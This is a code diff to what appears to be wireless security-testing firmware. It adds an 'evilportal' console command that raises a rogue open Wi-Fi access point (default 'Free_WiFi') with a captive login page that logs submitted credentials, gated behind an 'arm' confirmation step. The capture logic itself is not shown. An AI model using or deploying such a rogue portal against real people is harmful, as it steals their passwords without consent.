@@ -27,6 +27,7 @@
 #include "lxveos_ble.h"
 #include "lxveos_board.h"
 #include "lxveos_caps.h"
+#include "lxveos_evilportal.h"
 #include "lxveos_ops.h"
 #include "lxveos_wifi.h"
 
@@ -1173,6 +1174,44 @@ static int cmd_disarm(int argc, char **argv)
     return 0;
 }
 
+// `evilportal [ssid|stop]` — the evil_portal op: rogue OPEN AP + captive credential-capture portal. An
+// OFFENSIVE-TX op, so it needs arm (`agree`, then `arm` -> `arm <token>`). `evilportal stop` tears it down
+// and reports the capture count; `evilportal [ssid]` starts it (default SSID if none given).
+static int cmd_evilportal(int argc, char **argv)
+{
+    if (locked()) {
+        return 0;
+    }
+    if (!lxveos_cap_active(LXVEOS_CAP_WIFI)) {
+        printf("wifi capability is not active on this build — cannot run evil-portal\n");
+        return 0;
+    }
+    if (argc >= 2 && strcmp(argv[1], "stop") == 0) {
+        lxveos_evilportal_stop();
+        printf("evil-portal stopped (%u credential(s) captured)\n",
+               (unsigned)lxveos_evilportal_captures());
+        return 0;
+    }
+    if (lxveos_evilportal_running()) {
+        printf("evil-portal already running (%u captured) — 'evilportal stop' to end\n",
+               (unsigned)lxveos_evilportal_captures());
+        return 0;
+    }
+    if (!lxveos_arm_can_emit()) {
+        printf("offensive TX not permitted — run 'arm' first (this is an offensive-TX op).\n");
+        return 0;
+    }
+    const char *ssid = (argc >= 2) ? argv[1] : "Free_WiFi";
+    esp_err_t e = lxveos_evilportal_start(ssid);
+    if (e == ESP_OK) {
+        printf("evil-portal up: OPEN AP \"%s\" — captive login at http://192.168.4.1/  (armed)\n", ssid);
+        printf("submitted credentials are logged (WARN) + counted; 'evilportal stop' to end.\n");
+    } else {
+        printf("evil-portal start failed: %s\n", esp_err_to_name(e));
+    }
+    return 0;
+}
+
 static void register_commands(void)
 {
     const esp_console_cmd_t cmds[] = {
@@ -1196,6 +1235,7 @@ static void register_commands(void)
         {.command = "status", .help = "One machine-readable status line (Cyber Controller bridge format)", .func = &cmd_status},
         {.command = "arm", .help = "Two-factor enable for offensive-TX ops: arm (request), then arm <token> (confirm)", .func = &cmd_arm},
         {.command = "disarm", .help = "Hard-disarm: return to SAFE (offensive TX not permitted)", .func = &cmd_disarm},
+        {.command = "evilportal", .help = "Rogue AP + captive credential portal (needs arm): evilportal [ssid|stop]", .func = &cmd_evilportal},
         {.command = "loglevel", .help = "Set log verbosity: loglevel <tag|*> <none|error|warn|info|debug|verbose>", .func = &cmd_loglevel},
         {.command = "reboot", .help = "Restart the unit", .func = &cmd_reboot},
         {.command = "nvs", .help = "Persistent settings: nvs get <key> | nvs set <key> <value>", .func = &cmd_nvs},
